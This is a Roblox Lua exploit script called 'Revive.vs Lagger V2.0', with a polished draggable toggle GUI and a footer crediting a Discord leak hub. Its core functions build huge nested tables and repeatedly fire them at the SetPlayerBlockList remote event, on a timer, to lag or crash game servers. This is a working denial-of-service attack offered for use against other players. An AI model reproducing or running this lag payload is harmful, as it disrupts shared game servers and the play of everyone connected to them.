local p = game:GetService("Players")
local ts = game:GetService("TweenService")
local uis = game:GetService("UserInputService")
local cg = game:GetService("CoreGui")
local rs = game:GetService("RunService")
local pl = p.LocalPlayer
local mb = uis.TouchEnabled and not uis.MouseEnabled
local cc = {ti=0.001,tr=1,wt=mb and 3 or 3}
local rp = "RobloxReplicatedStorage.SetPlayerBlockList"

local function rt(x)
if not x or x == "" then return nil end
local o = game
local c = x:gsub("^game%.","")
for s in c:gmatch("[^%.]+") do
if o then o = o[s] else return nil end
end
return o
end

local function gv(v)
local m = 499999
if type(v) ~= "number" then return nil end
return m / (v + 2)
end

local function bm(ti,tr)
local mt = {}
local st = {}
table.insert(st,{})
local z = st[1]
for i = 1, ti do
local ti2 = {}
table.insert(z,ti2)
z = ti2
end
local mx = gv(ti) or 9999999
for i = 1, mx do
table.insert(mt,st)
if i % 5000 == 0 then task.wait() end
end
local r = rt(rp)
if r then
for i = 1, tr do
pcall(function()
if r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") then
r:FireServer(mt)
elseif r:IsA("RemoteFunction") then
r:InvokeServer(mt)
end
end)
end
end
end

-- Black & white colors
local C_BG = Color3.fromRGB(15, 15, 15)
local C_PANEL = Color3.fromRGB(35, 35, 35)
local C_HEADER = Color3.fromRGB(25, 25, 25)
local C_BORDER = Color3.fromRGB(180, 180, 180)
local C_ACCENT = Color3.fromRGB(255, 255, 255)
local C_DIM = Color3.fromRGB(160, 160, 160)

local BG_TEX = "rbxassetid://96422107830225"
local CR = 10

local function createShimmerBorder(parent, speed, thickness)
speed = speed or 6; thickness = thickness or 2.5
local stroke = Instance.new("UIStroke")
stroke.Thickness = thickness; stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
stroke.Color = Color3.new(1,1,1); stroke.Transparency = 0; stroke.Parent = parent
local grad = Instance.new("UIGradient")
grad.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(180,180,180)),
ColorSequenceKeypoint.new(0.15, Color3.fromRGB(100,100,100)),
ColorSequenceKeypoint.new(0.30, Color3.fromRGB(220,220,220)),
ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(0.70, Color3.fromRGB(220,220,220)),
ColorSequenceKeypoint.new(0.85, Color3.fromRGB(100,100,100)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(180,180,180)),
})
grad.Transparency = NumberSequence.new({
NumberSequenceKeypoint.new(0, 0.85),
NumberSequenceKeypoint.new(0.15, 0.55),
NumberSequenceKeypoint.new(0.30, 0.90),
NumberSequenceKeypoint.new(0.50, 0.05),
NumberSequenceKeypoint.new(0.70, 0.90),
NumberSequenceKeypoint.new(0.85, 0.55),
NumberSequenceKeypoint.new(1, 0.85),
})
grad.Rotation = 0; grad.Parent = stroke
task.spawn(function()
while parent and parent.Parent do
grad.Rotation = (grad.Rotation + speed) % 360
local t = tick(); local pulse = (math.sin(t*2.2)+1)/2
stroke.Transparency = pulse * 0.06
stroke.Thickness = thickness + pulse * 0.5
task.wait(0.033)
end
end)
return stroke, grad
end

local function createGlassGradient(obj, speed)
speed = speed or 0.72
local grad = Instance.new("UIGradient")
grad.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(200,200,200)),
ColorSequenceKeypoint.new(0.30, Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(0.50, Color3.fromRGB(220,220,220)),
ColorSequenceKeypoint.new(0.70, Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(200,200,200)),
})
grad.Transparency = NumberSequence.new({
NumberSequenceKeypoint.new(0, 0.25),
NumberSequenceKeypoint.new(0.30, 0.0),
NumberSequenceKeypoint.new(0.50, 0.08),
NumberSequenceKeypoint.new(0.70, 0.0),
NumberSequenceKeypoint.new(1, 0.25),
})
grad.Rotation = 90; grad.Parent = obj
task.spawn(function()
while obj and obj.Parent do
grad.Rotation = (grad.Rotation + speed) % 360
task.wait(0.016)
end
end)
return grad
end

local function makeDraggableHandle(frame, handle)
handle = handle or frame
local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
handle.InputBegan:Connect(function(inp)
if inp.UserInputType == Enum.UserInputType.Touch
or inp.UserInputType == Enum.UserInputType.MouseButton1 then
dragging = true; dragStart = inp.Position; startPos = frame.Position
inp.Changed:Connect(function()
if inp.UserInputState == Enum.UserInputState.End then dragging = false end
end)
end
end)
handle.InputChanged:Connect(function(inp)
if inp.UserInputType == Enum.UserInputType.Touch
or inp.UserInputType == Enum.UserInputType.MouseMovement then
dragInput = inp
end
end)
uis.InputChanged:Connect(function(inp)
if inp == dragInput and dragging then
local d = inp.Position - dragStart
frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+d.X, startPos.Y.Scale, startPos.Y.Offset+d.Y)
end
end)
end

local gui = Instance.new("ScreenGui")
gui.Name = "Revive_vs_Lagger" -- updated
gui.Parent = cg
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.IgnoreGuiInset = true

local PW, PH = 210, 155
local HDR = 42

local mainGlow = Instance.new("Frame", gui)
mainGlow.Size = UDim2.new(0,PW+16,0,PH+16)
mainGlow.BackgroundColor3 = Color3.fromRGB(220,220,220)
mainGlow.BackgroundTransparency = 0.80
mainGlow.BorderSizePixel = 0
Instance.new("UICorner", mainGlow).CornerRadius = UDim.new(0,CR+6)

local main = Instance.new("Frame", gui)
main.Name = "Main"
main.Size = UDim2.new(0,0,0,0)
main.Position = UDim2.new(0.5,-PW/2, 0.5,-PH/2)
main.BackgroundColor3 = C_BG
main.BackgroundTransparency = 1
main.BorderSizePixel = 0
main.Active = true
main.ClipsDescendants = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0,CR)
createShimmerBorder(main, 6, 2.5)
makeDraggableHandle(main, main)

local bgImg = Instance.new("ImageLabel", main)
bgImg.Size = UDim2.new(1,0,1,0)
bgImg.BackgroundTransparency = 1
bgImg.Image = BG_TEX
bgImg.ImageTransparency = 0.75
bgImg.ScaleType = Enum.ScaleType.Crop
bgImg.ZIndex = 1
Instance.new("UICorner", bgImg).CornerRadius = UDim.new(0,CR)

rs.Heartbeat:Connect(function()
if main.Visible then
mainGlow.Position = UDim2.new(main.Position.X.Scale, main.Position.X.Offset-8,
main.Position.Y.Scale, main.Position.Y.Offset-8)
end
end)

local header = Instance.new("Frame", main)
header.Size = UDim2.new(1,0,0,HDR)
header.BackgroundColor3 = C_HEADER
header.BorderSizePixel = 0; header.ZIndex = 5
makeDraggableHandle(main, header)

local hDiv = Instance.new("Frame", header)
hDiv.Size = UDim2.new(1,0,0,1); hDiv.Position = UDim2.new(0,0,1,-1)
hDiv.BackgroundColor3 = C_BORDER; hDiv.BorderSizePixel = 0; hDiv.ZIndex = 6
createShimmerBorder(hDiv, 2, 1)

local LS = 28
local logoF = Instance.new("Frame", header)
logoF.Size = UDim2.new(0,LS,0,LS)
logoF.Position = UDim2.new(0,10,0.5,-LS/2)
logoF.BackgroundColor3 = C_PANEL; logoF.BorderSizePixel = 0; logoF.ZIndex = 6
Instance.new("UICorner", logoF).CornerRadius = UDim.new(0,7)
createShimmerBorder(logoF, 3, 1.2)

-- Logo: "RL" text label
local logoText = Instance.new("TextLabel", logoF)
logoText.Size = UDim2.new(1,0,1,0)
logoText.BackgroundTransparency = 1
logoText.Text = "RL"
logoText.TextColor3 = C_ACCENT
logoText.Font = Enum.Font.GothamBlack
logoText.TextSize = 14
logoText.ZIndex = 7
createGlassGradient(logoText)

local titleL = Instance.new("TextLabel", header)
titleL.Size = UDim2.new(0,115,0,15)
titleL.Position = UDim2.new(0,LS+16,0,8)
titleL.BackgroundTransparency = 1
titleL.Text = "Revive.vs Lagger" -- updated
titleL.TextColor3 = C_ACCENT
titleL.Font = Enum.Font.GothamBlack
titleL.TextSize = 12
titleL.TextXAlignment = Enum.TextXAlignment.Left
titleL.ZIndex = 6
createGlassGradient(titleL)

local subTitleL = Instance.new("TextLabel", header)
subTitleL.Size = UDim2.new(0,80,0,10)
subTitleL.Position = UDim2.new(0,LS+17,0,26)
subTitleL.BackgroundTransparency = 1
subTitleL.Text = "V2.0"
subTitleL.TextColor3 = C_DIM
subTitleL.Font = Enum.Font.Gotham
subTitleL.TextSize = 9
subTitleL.TextXAlignment = Enum.TextXAlignment.Left
subTitleL.ZIndex = 6
createGlassGradient(subTitleL)

local minBtn = Instance.new("TextButton", header)
minBtn.Size = UDim2.new(0,28,0,28)
minBtn.Position = UDim2.new(1,-34,0.5,-14)
minBtn.BackgroundColor3 = C_PANEL; minBtn.BorderSizePixel = 0
minBtn.Text = "-"; minBtn.TextColor3 = C_ACCENT
minBtn.Font = Enum.Font.GothamBlack; minBtn.TextSize = 18; minBtn.ZIndex = 10
Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0,7)
createShimmerBorder(minBtn, 3, 1.2)
createGlassGradient(minBtn)

local row = Instance.new("Frame", main)
row.Size = UDim2.new(1,-18,0,38)
row.Position = UDim2.new(0,9,0,HDR+7)
row.BackgroundColor3 = C_PANEL; row.BorderSizePixel = 0; row.ZIndex = 3
Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
createShimmerBorder(row, 4, 1.2)

local rowBg = Instance.new("ImageLabel", row)
rowBg.Size = UDim2.new(1,0,1,0)
rowBg.BackgroundTransparency = 1; rowBg.Image = BG_TEX
rowBg.ImageTransparency = 0.86; rowBg.ScaleType = Enum.ScaleType.Crop; rowBg.ZIndex = 2
Instance.new("UICorner", rowBg).CornerRadius = UDim.new(0,8)

local tt2 = Instance.new("TextLabel", row)
tt2.Size = UDim2.new(0,90,1,0)
tt2.Position = UDim2.new(0,10,0,0)
tt2.BackgroundTransparency = 1; tt2.Text = "LAGGER"
tt2.TextColor3 = C_ACCENT; tt2.Font = Enum.Font.GothamBlack
tt2.TextSize = 13; tt2.TextXAlignment = Enum.TextXAlignment.Left; tt2.ZIndex = 4
createGlassGradient(tt2)

local tb = Instance.new("TextButton", row)
tb.Size = UDim2.new(0,50,0,22)
tb.Position = UDim2.new(1,-58,0.5,-11)
tb.BackgroundColor3 = Color3.fromRGB(18,18,18)
tb.BorderSizePixel = 0; tb.Text = ""; tb.AutoButtonColor = false; tb.ZIndex = 4
Instance.new("UICorner", tb).CornerRadius = UDim.new(1,0)
local tbst = Instance.new("UIStroke")
tbst.Thickness = 1; tbst.Color = C_BORDER; tbst.Transparency = 0.4; tbst.Parent = tb

local kn = Instance.new("Frame", tb)
kn.Size = UDim2.new(0,16,0,16)
kn.Position = UDim2.new(0,3,0.5,-8)
kn.BackgroundColor3 = Color3.fromRGB(255,255,255)
kn.BorderSizePixel = 0; kn.ZIndex = 5
Instance.new("UICorner", kn).CornerRadius = UDim.new(1,0)

local kbRow = Instance.new("Frame", main)
kbRow.Size = UDim2.new(1,-18,0,28)
kbRow.Position = UDim2.new(0,9,0,HDR+7+38+6)
kbRow.BackgroundColor3 = C_PANEL; kbRow.BorderSizePixel = 0; kbRow.ZIndex = 3
Instance.new("UICorner", kbRow).CornerRadius = UDim.new(0,8)
createShimmerBorder(kbRow, 3, 1.0)

local kbRowBg = Instance.new("ImageLabel", kbRow)
kbRowBg.Size = UDim2.new(1,0,1,0)
kbRowBg.BackgroundTransparency = 1; kbRowBg.Image = BG_TEX
kbRowBg.ImageTransparency = 0.88; kbRowBg.ScaleType = Enum.ScaleType.Crop; kbRowBg.ZIndex = 2
Instance.new("UICorner", kbRowBg).CornerRadius = UDim.new(0,8)

local kbLabel = Instance.new("TextLabel", kbRow)
kbLabel.Size = UDim2.new(0,90,1,0)
kbLabel.Position = UDim2.new(0,10,0,0)
kbLabel.BackgroundTransparency = 1; kbLabel.Text = "KEYBIND"
kbLabel.TextColor3 = C_DIM; kbLabel.Font = Enum.Font.GothamBold
kbLabel.TextSize = 10; kbLabel.TextXAlignment = Enum.TextXAlignment.Left; kbLabel.ZIndex = 4

local kbBtn = Instance.new("TextButton", kbRow)
kbBtn.Size = UDim2.new(0,38,0,20)
kbBtn.Position = UDim2.new(1,-44,0.5,-10)
kbBtn.BackgroundColor3 = Color3.fromRGB(28,28,28)
kbBtn.BorderSizePixel = 0; kbBtn.Text = "P"; kbBtn.AutoButtonColor = false
kbBtn.TextColor3 = C_ACCENT; kbBtn.Font = Enum.Font.GothamBlack; kbBtn.TextSize = 11; kbBtn.ZIndex = 5
Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0,6)
createShimmerBorder(kbBtn, 3, 1.0)
createGlassGradient(kbBtn)

local sub = Instance.new("TextLabel", main)
sub.Size = UDim2.new(1,-18,0,12)
sub.Position = UDim2.new(0,9,1,-18)
sub.BackgroundTransparency = 1
sub.Text = "LEAKED AT EXE HUB https://discord.gg/TXU8ByQS5"
sub.TextColor3 = C_DIM
sub.Font = Enum.Font.Gotham
sub.TextSize = 8
sub.TextXAlignment = Enum.TextXAlignment.Center
sub.ZIndex = 3

local MW, MH = 124, 28
local miniGlow = Instance.new("Frame", gui)
miniGlow.Size = UDim2.new(0,MW+14,0,MH+14)
miniGlow.BackgroundColor3 = Color3.fromRGB(220,220,220)
miniGlow.BackgroundTransparency = 0.82; miniGlow.BorderSizePixel = 0
miniGlow.Visible = false
Instance.new("UICorner", miniGlow).CornerRadius = UDim.new(0,CR+4)

local miniBar = Instance.new("Frame", gui)
miniBar.Name = "MiniBar"
miniBar.Size = UDim2.new(0,MW,0,MH)
miniBar.BackgroundColor3 = C_PANEL; miniBar.BorderSizePixel = 0
miniBar.Active = true; miniBar.Visible = false
Instance.new("UICorner", miniBar).CornerRadius = UDim.new(0,CR)
createShimmerBorder(miniBar, 5, 1.5)

local miniBg = Instance.new("ImageLabel", miniBar)
miniBg.Size = UDim2.new(1,0,1,0)
miniBg.BackgroundTransparency = 1; miniBg.Image = BG_TEX
miniBg.ImageTransparency = 0.82; miniBg.ScaleType = Enum.ScaleType.Crop; miniBg.ZIndex = 1
Instance.new("UICorner", miniBg).CornerRadius = UDim.new(0,CR)

local miniIcon = Instance.new("TextLabel", miniBar)
miniIcon.Size = UDim2.new(0,24,1,0); miniIcon.Position = UDim2.new(0,5,0,0)
miniIcon.BackgroundTransparency = 1; miniIcon.Text = "+"
miniIcon.TextColor3 = C_ACCENT; miniIcon.Font = Enum.Font.GothamBlack
miniIcon.TextSize = 18; miniIcon.ZIndex = 5
createGlassGradient(miniIcon)

local miniLabel = Instance.new("TextLabel", miniBar)
miniLabel.Size = UDim2.new(1,-32,1,0); miniLabel.Position = UDim2.new(0,30,0,0)
miniLabel.BackgroundTransparency = 1
miniLabel.Text = "Revive.vs Lagger" -- updated
miniLabel.TextColor3 = C_ACCENT
miniLabel.Font = Enum.Font.GothamBlack
miniLabel.TextSize = 9
miniLabel.ZIndex = 5
createGlassGradient(miniLabel)

local miniClick = Instance.new("TextButton", miniBar)
miniClick.Size = UDim2.new(1,0,1,0); miniClick.BackgroundTransparency = 1
miniClick.Text = ""; miniClick.ZIndex = 6

local miniDragging, miniDragInput, miniDragStart, miniStartPos = false, nil, nil, nil
local miniMoved = false

miniClick.InputBegan:Connect(function(inp)
if inp.UserInputType == Enum.UserInputType.Touch
or inp.UserInputType == Enum.UserInputType.MouseButton1 then
miniDragging = true
miniMoved = false
miniDragStart = inp.Position
miniStartPos = miniBar.Position
inp.Changed:Connect(function()
if inp.UserInputState == Enum.UserInputState.End then
miniDragging = false
end
end)
end
end)

miniClick.InputChanged:Connect(function(inp)
if inp.UserInputType == Enum.UserInputType.Touch
or inp.UserInputType == Enum.UserInputType.MouseMovement then
miniDragInput = inp
end
end)

uis.InputChanged:Connect(function(inp)
if inp == miniDragInput and miniDragging then
local d = inp.Position - miniDragStart
if math.abs(d.X) > 4 or math.abs(d.Y) > 4 then
miniMoved = true
end
miniBar.Position = UDim2.new(miniStartPos.X.Scale, miniStartPos.X.Offset+d.X,
miniStartPos.Y.Scale, miniStartPos.Y.Offset+d.Y)
end
end)

miniClick.MouseButton1Click:Connect(function()
if not miniMoved then
main.Position = UDim2.new(miniBar.Position.X.Scale, miniBar.Position.X.Offset,
miniBar.Position.Y.Scale, miniBar.Position.Y.Offset)
main.Visible = true; mainGlow.Visible = true
miniBar.Visible = false; miniGlow.Visible = false
end
end)

rs.Heartbeat:Connect(function()
if miniBar.Visible then
miniGlow.Position = UDim2.new(miniBar.Position.X.Scale, miniBar.Position.X.Offset-7,
miniBar.Position.Y.Scale, miniBar.Position.Y.Offset-7)
end
end)

local function hideGUI()
miniBar.Position = UDim2.new(main.Position.X.Scale, main.Position.X.Offset,
main.Position.Y.Scale, main.Position.Y.Offset)
main.Visible = false; mainGlow.Visible = false
miniBar.Visible = true; miniGlow.Visible = true
end

minBtn.MouseButton1Click:Connect(hideGUI)

local on=false
local run=false
local th=nil
local function sl()if run then return end run=true th=task.spawn(function()while run do task.spawn(function()bm(cc.ti,cc.tr)end)task.wait(cc.wt)end end)end
local function spl()run=false if th then task.cancel(th)th=nil end end
local togDB = false
local function tg()
if togDB then return end; togDB = true
task.delay(0.15, function() togDB = false end)
on = not on
ts:Create(kn, TweenInfo.new(0.12,Enum.EasingStyle.Quad), {
Position = on and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)
}):Play()
tb.BackgroundColor3 = on and Color3.fromRGB(180,180,180) or Color3.fromRGB(18,18,18)
tbst.Color = on and Color3.fromRGB(200,200,200) or C_BORDER
if on then sl() else spl() end
end

tb.MouseButton1Click:Connect(tg)

local kbKey = "P"
local kbListening = false
kbBtn.MouseButton1Click:Connect(function()
if kbListening then return end
kbListening = true
kbBtn.Text = "..."
kbBtn.TextColor3 = Color3.fromRGB(255,220,80)
local conn; conn = uis.InputBegan:Connect(function(input, gpe)
if gpe then return end
if input.UserInputType == Enum.UserInputType.Keyboard then
local raw = tostring(input.KeyCode):gsub("Enum%.KeyCode%.","")
if raw ~= "Return" and raw ~= "Escape" then
kbKey = raw
kbBtn.Text = raw
else
kbBtn.Text = kbKey
end
kbBtn.TextColor3 = C_ACCENT
kbListening = false
conn:Disconnect()
end
end)
end)

uis.InputBegan:Connect(function(input, gpe)
if gpe or kbListening then return end
if input.UserInputType == Enum.UserInputType.Keyboard then
local key = tostring(input.KeyCode):gsub("Enum%.KeyCode%.","")
if key == kbKey then tg() end
end
end)

ts:Create(main, TweenInfo.new(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out),
{BackgroundTransparency=0, Size=UDim2.new(0,PW,0,PH)}):Play()
